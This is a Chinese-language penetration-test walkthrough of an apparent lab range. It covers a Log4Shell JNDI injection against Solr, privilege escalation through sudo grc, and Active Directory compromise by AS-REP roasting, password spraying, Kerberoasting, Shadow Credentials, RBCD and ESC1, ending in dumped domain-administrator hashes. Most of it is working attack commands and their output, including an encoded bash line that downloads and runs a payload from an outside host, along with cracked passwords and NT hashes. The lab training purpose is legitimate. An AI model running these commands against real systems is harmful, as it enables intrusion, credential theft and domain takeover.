
# 外网

solr 8.11.0有log4j2漏洞

**log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。**

**攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）。**



```bash
root@VM-8-5-ubuntu:~# fscan -h 39.98.127.9 -p 1-65535

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.98.127.9:22 open
39.98.127.9:80 open
39.98.127.9:8983 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://39.98.127.9        code:200 len:612    title:Welcome to nginx!
[*] WebTitle http://39.98.127.9:8983   code:302 len:0      title:None 跳转url: http://39.98.127.9:8983/solr/
[*] WebTitle http://39.98.127.9:8983/solr/ code:200 len:16555  title:Solr Admin
已完成 3/3
```

```
http://39.98.127.9:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.cvuwq9.dnslog.cn}
```

外带出来jdk版本，其实页面上也能扒拉出来

```bash
root@VM-8-5-ubuntu:~# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,KGN1cmwgLWZzU0wgLW0xODAgaHR0cDovLzIxMS4xNTkuMTc1LjIxOjIzMzMvc2x0fHx3Z2V0IC1UMTgwIC1xIGh0dHA6Ly8yMTEuMTU5LjE3NS4yMToyMzMzL3NsdCl8c2g=}|{base64,-d}|{bash,-i}" -A "211.159.175.21"
[ADDRESS] >> 211.159.175.21
[COMMAND] >> bash -c {echo,KGN1cmwgLWZzU0wgLW0xODAgaHR0cDovLzIxMS4xNTkuMTc1LjIxOjIzMzMvc2x0fHx3Z2V0IC1UMTgwIC1xIGh0dHA6Ly8yMTEuMTU5LjE3NS4yMToyMzMzL3NsdCl8c2g=}|{base64,-d}|{bash,-i}
----------------------------JNDI Links----------------------------
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://211.159.175.21:1099/tnihd5
ldap://211.159.175.21:1389/tnihd5
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://211.159.175.21:1099/wiz9do
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://211.159.175.21:1099/ja1wrr
ldap://211.159.175.21:1389/ja1wrr

----------------------------Server Log----------------------------
2026-09-30 10:43:36 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2026-09-30 10:43:36 [RMISERVER]  >> Listening on 0.0.0.0:1099
2026-09-30 10:43:36 [LDAPSERVER] >> Listening on 0.0.0.0:1389
2026-09-30 10:47:09 [LDAPSERVER] >> Send LDAP reference result for ja1wrr redirecting to http://211.159.175.21:8180/ExecTemplateJDK8.class
2026-09-30 10:47:09 [JETTYSERVER]>> Log a request to http://211.159.175.21:8180/ExecTemplateJDK8.class
```

```
http://39.98.127.9:8983/solr/admin/cores?action=${jndi:ldap://211.159.175.21:1389/ja1wrr}
```
直接上线vshell

```bash
solr@ubuntu:/tmp$ sudo -l
Matching Defaults entries for solr on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User solr may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/grc
solr@ubuntu:/tmp$ file /usr/bin/grc
/usr/bin/grc: Python script, ASCII text executable
```
这是个py脚本有sudo权限，直接提权即可

```bash
solr@ubuntu:/tmp$ sudo /usr/bin/grc --colour=off /bin/bash
root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

本地有psql数据库

```bash
sudo -u postgres psql
```
但是都是默认表

# 内网

打内网花了我挺长时间的的，主要是入手的时候，后来想到了smb，这里fscan是不会检测smb匿名列目录的，所以以后先来一遍fscan再来一边nmap？

```bash
root@ubuntu:~# fscan -h 172.22.9.19/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.9.19     is alive
(icmp) Target 172.22.9.7      is alive
(icmp) Target 172.22.9.47     is alive
(icmp) Target 172.22.9.26     is alive
[*] Icmp alive hosts len is: 4
172.22.9.47:21 open
172.22.9.19:22 open
172.22.9.26:445 open
172.22.9.7:445 open
172.22.9.47:445 open
172.22.9.26:139 open
172.22.9.7:139 open
172.22.9.26:135 open
172.22.9.47:139 open
172.22.9.7:135 open
172.22.9.7:80 open
172.22.9.47:80 open
172.22.9.47:22 open
172.22.9.19:80 open
172.22.9.7:88 open
[*] alive ports len is: 15
start vulscan
[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC
[*] NetInfo
[*]172.22.9.26
   [->]DESKTOP-CBKTVMO
   [->]172.22.9.26
[*] NetInfo
[*]172.22.9.7
   [->]XIAORANG-DC
   [->]172.22.9.7
[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] NetBios 172.22.9.47     fileserver                          Windows 6.1
[*] OsInfo 172.22.9.47  (Windows 6.1)
[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server
[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect
```

| 主机            | 角色/系统                                                               | 开放端口                | 关键信息                                     |
| ------------- | ------------------------------------------------------------------- | ------------------- | ---------------------------------------- |
| `172.22.9.7`  | 域控，`XIAORANG-DC`，域 `XIAORANG`                                       | `80,88,135,139,445` | IIS，Kerberos，SMB/RPC，检测到 AD CS `certsrv` |
| `172.22.9.26` | `DESKTOP-CBKTVMO.xiaorang.lab`，Windows Server 2016 Datacenter 14393 | `135,139,445`       | 域内 Windows，SMB/RPC，无 Web                 |
| `172.22.9.47` | NetBios `fileserver`，OS 显示 Windows 6.1；Web 是 Ubuntu Apache 默认页      | `21,22,80,139,445`  | FTP、SSH、HTTP、SMB，系统信息有冲突                 |

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q smbclient -L //172.22.9.47 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        fileshare       Disk      bill share
        IPC$            IPC       IPC Service (fileserver server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FILESERVER
```
里面有个sqlite3的db文件，有user和pass

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# sqlite3 personnel.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
xr_members  xr_salary   xr_users
sqlite>
```

本来想看密码锁定策略但是看不了

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q crackmapexec smb 172.22.9.7 --pass-pol
SMB         172.22.9.7      445    XIAORANG-DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:XIAORANG-DC) (domain:xiaorang.lab) (signing:True) (SMBv1:False)

```

然后就是打AS-REP Roasting筛一下用户

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q GetNPUsers.py xiaorang.lab/ -no-pass -usersfile user.txt -dc-ip 172.22.9.7
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User wanghao doesn't have UF_DONT_REQUIRE_PREAUTH set
```
一小部分可以看到，其实Kerberos会报哪些用户找不到，然后筛一下效率更高，但是打完我看其他wp的时候发现Kerberos漏了一个用户，不影响这个靶子，但是以后还是不要筛

```bash
pc -q GetNPUsers.py xiaorang.lab/ -dc-ip 172.22.9.7 -no-pass -usersfile user.txt > npusers.log 2>&1
grep -oP 'User \K\S+(?= doesn.t have)' npusers.log | sort -u > valid_users.txt
```

筛完cme撞一下密码，这里不要撞47这台机器，他允许匿名访问，都是+

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q crackmapexec smb 172.22.9.7 172.22.9.26  -u valid_users.txt -p pass.txt --continue-on
```

撞完能拿到凭据，然后走一遍Kerberoasting看看有没有注册SPN的

```
[+] xiaorang.lab\zhangjian:i9XDE02pLVf
[+] xiaorang.lab\liupeng:fiAzGwEMgTY
```


```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -outputfile spn.hash
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation
-------------------------------------  --------  --------  --------------------------  ---------  ----------
TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 12:45:45.213944  <never>              
WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 12:45:45.213944  <never>              
TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 12:45:39.767035  <never>  
```

然后hashcat破解一下

```bash

┌──(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# hashcat -m 13100 spn.hash --show
$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$0f6191f4dab7fa18ff0f39c60e389700$5db51426614adcb8b8d43e70549307619c57aa024840afd28cd2ef6a18be76c2d063934cc757c07e44f4e922b2c0e6d9e562f9d730bbc94de244e5bf407120ff0439c088dc56c1c1d6e149f5c070a57523de37878da6cf3f0123ad9eb01b11039b429963e0e4d78243e978284aad2007898569f634b2218bfa9e27875db0032dd7db32e90f10a036e6c13edf103b2de42604abd2fa5103b05e292907ecea0bb863254263489a5dcb673f836b07ad102ac44018fda6907084a3ab351aace219e62e27e8e7a0b955d5c11d7c1bdb3005196edaa61e3a1f316f0eb0b448dfb5aba39c61f97bd6b5c9a5f6cdeb9618fdd2b147a195e9c9e247c1f53f69762c62b34c9d70054b2f1709d7c13b54e375b49227ef8b78bc25dfc7403325ee2982129b1923631bbc2f209d6ef8ddd201055c828ced9e8b1ce55b4a7f0d80b9c1b3bc6ff732e1119b4b920d31f68d3d3f37438a4c7867e3a3129fcff17f2eb53a2a88d2dd9c30f5a78fc2d17e351842f562dc1fe749359f10cd9f7d86383d51e670c5adeaabb8604e2cfd610712e8b3122b8b1827a827421cc8b48c32e4d6b7455b70113d3b25c30fad395ed752a7f142d4cf7db7adbdf118869c3f5ba3e5ae50a5489ed0ae41ee68aaa7eeeec9b447f7f742ca042897a05874d476d8b6a5c3c3d1e41c49b60eae747c3da8b315e254554a69d09e1278a696ebdfd575516195c5911540540934e8001b18cda9f742557450f4c5518f298937058839df5c4d5b19063f3a156b4a1200f0e2d6bf85973c47a5dbf564d3b814efb6000ac241230a23142b43eb7967beb9ff08d64e6d9a7dd4b578149a5c8aab5ccef2aaed8cecf968088039adf30d530528b942c67b45b65b196051d81107d89d3037dbd3dec869d22a74eaed46e95f1ffe982073d3666274b2413e211e70c7999985fb67aa6d2604d59897765cbc8bcc3201a95b2098056b1b6d45a700e88263573099bcb13a3122cf95f90ff39d58ae941bd4fa8349a3f709328032a30d90cd30dfee09c3d2e6171338302e1d03206d484785502bd022ece1c7ac75215557ba8ceb809b8f4bd62c920f42f6f8d8a16517a48959cf76f28248caf6db54d283a5942efa9970e848234adeef393c0dbfde434bdf5a2bbff64ed26ecd8bc800fbc362d0cc33f30db93f8f2a562053f58a2e3c6c26d790d30ddac10c92a3daaa0a8267944d6943b159ec6b5a43d19b487cba76f9fc03821a878894c657b2d026cf5df6131c9c3e73222840ed760f322a4b393b2bb589ae9c33049e55e8b8bf3ef0978faba69d20a3f0659e205dd5a6b14283d3f6384ceef84c72b897bb9ddb19e69f4685d5d2dc5b6feb4f9369acd224baaa6fbe0c6ab73bb4f5a2decd0182c56eb1c18f556f546dc07edee2c3213217e6fd55eae7ca2cc0b2b4a291f376d01ee2b9593c7847a5c945926fe8a2478c3455a48e6dd8af1b548de1fd02fdfd18d27b9ca1a184e44fee54c85d197315ddbca807afee0775f4f250993902:MyPass2@@6
$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$b7ed071ddc81e26cb32c7416687d740a$148ec187ded0b993357017b9d2cf2f15cbcc5b98ead599d0b9d62f719fc87b68c45ebb470ba087d28d3fd59a1aa8bc692e72229afe954cf265fed0cf8abf8308d54d4a868444916c95077bc698fbd057cc04503caed39ada14d9084327fc339387bbb574958f44e1134ab34f8c46aada6ef265b316bbbdca265523d9245cf47cfc2d847b735a7443e1a4ad2e588fd07b854cb6d6577404c4c28c2a448b58556433fcd1501199ac35ce6b249448ec66ca398ec732df50ebb9a0ca68ae0ad7159150870e6758e7680fdde127cff4bd7f5a575d818918e2979bb44b500528f3c703e9b5d5acc34be2703905b63a3503dbfae3c3b37e11f6e76b86b3a6cdecff0b5e03f3690319ec97f6711405223abb112ba4516ac9707f9014526b3de87ce83dcea17d0aaaedb1ba657114d1aade82b8578d5b9ae124fa1fca521672081463b73b7bef61d13444d2dadb066af0c350337e8988bae3cb8ffc15a90ac0e93e1cc5914b4db364b23fcdd762314194c84ab64b887293a7b2e532a85cff78a5846f12ebab39d4b8ca3ada957efa3969bb5ffe579d5b9baba59826860d49dc7f64387d20cd6c0429ee5ed14d7773209eedda0f00dde1a92c68be702520f9f7d96c73cf13d3f15835f639055b20d2857b412d07325af0994e748dcadff91178b3cd17348e69a8486ba5965cd33803ee54a123c385a216cf13e58929123bd0fd2a1b561a1fbd6036384746e39cb99f7ceeed3456d210ed398aa511933fa3a870396935ca8096c30738724773a3063a06dd43c2bb9880b54e4f200edbc032a3a0b3dfb01caeb5a839a5c1d31b0e7d0f9afb88b51ec169d1934f381598256dab44a31ee0343bf6593829d50ed59a57f72425e0f80a5b96627949f7ff58d9a38621a866e1c74e04be9bb97455e42831a77de2fa9b0dcf8bbb983e2c8a1d1a6290677e4026f5bb46163c3d5e7ecb1c1ffb5b5c707b96089a66e6827b537e72baa1bb6dcc53efc6ddb4ae99a75b7e0b5d408060808a881d36406a624cc329f88030f126bf9af9d7d8b9cd7b0cd2b2b98a255d9d4786445673f6d9ce58c514f1034e52795f76f6894c7dd6240e8fb2be2300d6f3e2c027888086b577757639b206528a186eb5f04af239673227b59bb6aeee0e600693cc61b5f1580892074f55533895cda7dc21ab36ea0f3ef99bc53675d79c800cc04ac8a1e8b054222c755f0b5e3ca3042281340628746f0fb500b64a57de91caf1d601b67fba636d6a5daa4a5b1225fe25044e004c1a845cb19453379037fc0e8a6fdf779cf7906acaef0d84b3c7e88023ea04c13b278dbbe5ca5f908427438cd0d58609054636d1c202fc7eebb457ee9ac2b6702469e04f334b75f2d82405b96e4152c879d146b3cc1ee7dae22a5a39ac0e9f08da44fbad32411d5402a16647f2755646cbd29e21fde4b7316652341fccaeb556fedd19034fb79c1814c9c33a11963bf39848ea1a4e60e7801aa1392d3b9b6afe673085cfbabdb75900bbbd091f:@Passw0rd@
```

到现在手里有四组凭据了

```bash
chenchen/@Passw0rd@
zhangxia/MyPass2@@6
zhangjian/i9XDE02pLVf
liupeng/fiAzGwEMgTY
```

然后bloodhound收集下信息，可以用py，比较方便，但是py收集的不如.net程序全

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q python3 bloodhound.py --zip -c All -d xiaorang.lab -u zhangjian -p i9XDE02pLVf -dc XIAORANG-DC.xiaorang.lab --dns-tcp -ns 172.22.9.7
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: xiaorang.lab
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: XIAORANG-DC.xiaorang.lab
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: XIAORANG-DC.xiaorang.lab
INFO: Found 95 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.lab
INFO: Querying computer: XIAORANG-DC.xiaorang.lab
INFO: Done in 00M 09S
INFO: Compressing output into 20260930111610_bloodhound.zip
```

查找指定用户标记own
```
MATCH (u:User {name: 'LIUPENG@XIAORANG.LAB'}) RETURN u
```


![Pasted image 20260930112013.png](https://cdn.jsdelivr.net/gh/faabbi/faabbi.github.io@85bd40c1c4297550413cf1fb2b17482ccaab802f/images/certify/Pasted%20image%2020260930112013.png)

可以看到zhangxia对域控有GenericWrite权限，到这里我们可以打**RBCD**(资源委派)也可以打**Shadow Credentials**

**Shadow Credentials**：往 `msDS-KeyCredentialLink` 写证书，然后以 `XIAORANG-DC$` 身份拿 TGT

**RBCD**：改 `msDS-AllowedToActOnBehalfOfOtherIdentity`，让一个你控制的机器账户代表域控，然后拿服务票据。
## Shadow Credentials

 `-ldap-scheme ldap` 强制 389，不走 636。

 `-no-ldap-signing` 关闭 LDAP 签名要求，避免被域控断开。

 `-ldap-simple-auth` 用 SIMPLE 绑定，和 `ldapsearch -x` 一致。

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q certipy shadow auto -u zhangxia@xiaorang.lab -p 'MyPass2@@6' -account 'XIAORANG-DC$' -dc-ip 172.22.9.7 -ldap-scheme ldap -no-ldap-signing -ldap-simple-auth -dns-tcp -ns 172.22.9.7
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'XIAORANG-DC$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8c0965d146814b3fa7d05043df2acb81'
[*] Adding Key Credential with device ID '8c0965d146814b3fa7d05043df2acb81' to the Key Credentials for 'XIAORANG-DC$'
[*] Successfully added Key Credential with device ID '8c0965d146814b3fa7d05043df2acb81' to the Key Credentials for 'XIAORANG-DC$'
[*] Authenticating as 'XIAORANG-DC$' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'xiaorang-dc$@xiaorang.lab'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'xiaorang-dc.ccache'
File 'xiaorang-dc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'xiaorang-dc.ccache'
[*] Trying to retrieve NT hash for 'xiaorang-dc$'
[*] Restoring the old Key Credentials for 'XIAORANG-DC$'
[*] Successfully restored the old Key Credentials for 'XIAORANG-DC$'
[*] NT hash for 'XIAORANG-DC$': dc4b65d3aabb4ba893c09f79abcd070a
```

然后dumphash
```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q secretsdump.py -hashes :dc4b65d3aabb4ba893c09f79abcd070a 'xiaorang.lab/XIAORANG-DC$'@172.22.9.7 -dc-ip 172.22.9.7 -just-dc-user administrator
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:4045851aff748239d1102ab9546df9c080a2525c27f4b385412daa7edce536a8
Administrator:aes128-cts-hmac-sha1-96:14187f91e48d1943cf011faebab92fa8
Administrator:des-cbc-md5:dad07cabc7624608
[*] Cleaning up...
```

## RBCD(资源委派)

检查配合

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q ldapsearch -x -H ldap://172.22.9.7 -D 'zhangxia@xiaorang.lab' -w 'MyPass2@@6' -b 'DC=xiaorang,DC=lab' '(objectClass=domainDNS)' ms-DS-MachineAccountQuota
# extended LDIF
#
# LDAPv3
# base <DC=xiaorang,DC=lab> with scope subtree
# filter: (objectClass=domainDNS)
# requesting: ms-DS-MachineAccountQuota
#

# xiaorang.lab
dn: DC=xiaorang,DC=lab
ms-DS-MachineAccountQuota: 10

# search reference
ref: ldap://ForestDnsZones.xiaorang.lab/DC=ForestDnsZones,DC=xiaorang,DC=lab

# search reference
ref: ldap://DomainDnsZones.xiaorang.lab/DC=DomainDnsZones,DC=xiaorang,DC=lab

# search reference
ref: ldap://xiaorang.lab/CN=Configuration,DC=xiaorang,DC=lab

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```


加机器账户

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' -dc-ip 172.22.9.7 xiaorang.lab/zhangxia:'MyPass2@@6'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account EVIL$ with password Password123!.
```

加委派权限

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q rbcd.py -delegate-from 'EVIL$' -delegate-to 'XIAORANG-DC$' -action write -dc-ip 172.22.9.7 xiaorang.lab/zhangxia:'MyPass2@@6'                                                                                 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Accounts allowed to act on behalf of other identity:
[-] SID not found in LDAP: S-1-5-21-990187620-235975882-534697781-1212
[*] Delegation rights modified successfully!
[*] EVIL$ can now impersonate users on XIAORANG-DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[-] SID not found in LDAP: S-1-5-21-990187620-235975882-534697781-1212
[*]     EVIL$        (S-1-5-21-990187620-235975882-534697781-1213)
```

对域控装域管

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q getST.py -spn cifs/XIAORANG-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.9.7 'xiaorang.lab/EVIL$':'Password123!'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_XIAORANG-DC.xiaorang.lab@XIAORANG.LAB.ccache
```

导入票据dump hash，这里不加host解析会失败，

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify/BloodHound.py]
└─# pc -q secretsdump.py -k -no-pass XIAORANG-DC.xiaorang.lab -just-dc-user administrator -dc-ip 172.22.9.7
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:4045851aff748239d1102ab9546df9c080a2525c27f4b385412daa7edce536a8
Administrator:aes128-cts-hmac-sha1-96:14187f91e48d1943cf011faebab92fa8
Administrator:des-cbc-md5:dad07cabc7624608
[*] Cleaning up...
```


## ESC1

之前fscan也扫到了CA漏洞，同样也有ECS8，不过需要控靶机开中继，网鼎杯半决赛的那个靶机是ECS8可以打一下

ESC1 的核心在于证书模板的错误配置。当一个证书模板同时满足以下条件时，攻击者即可利用其进行提权：

- `ENROLLEE_SUPPLIES_SUBJECT` 标志位被启用（允许请求者自定义 Subject Alternative Name, SAN）。
- 模板允许低权限用户（如 `Domain Users` 或 `Authenticated Users`）进行注册。
- 模板的扩展密钥用法 (EKU) 包含客户端身份验证（Client Authentication）、智能卡登录 (Smart Card Logon) 或任何目的 (Any Purpose)。
- 无需 CA 管理员审批（No Manager Approval Required）。

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q certipy find -u zhangxia@xiaorang.lab -p 'MyPass2@@6' -dc-ip 172.22.9.7 -ldap-scheme ldap -stdout -vulnerable
```


```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q certipy req -u zhangxia@xiaorang.lab -p 'MyPass2@@6' -ca xiaorang-XIAORANG-DC-CA -target XIAORANG-DC.xiaorang.lab -template 'XR Manager' -upn Administrator@xiaorang.lab -dc-ip 172.22.9.7 -ldap-scheme ldap -ns 172.22.9.7
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.22.9.7@53 answered The DNS operation timed out.; Server Do53:172.22.9.7@53 answered The DNS operation timed out.; Server Do53:172.22.9.7@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@xiaorang.lab'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing/Certify]
└─# pc -q certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7 -ldap-scheme ldap
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@xiaorang.lab'
[*] Using principal: 'administrator@xiaorang.lab'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@xiaorang.lab': aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80
```

所以其实这台机器的域内提权还是有很多途径的，或许还有其他的只是我没发现
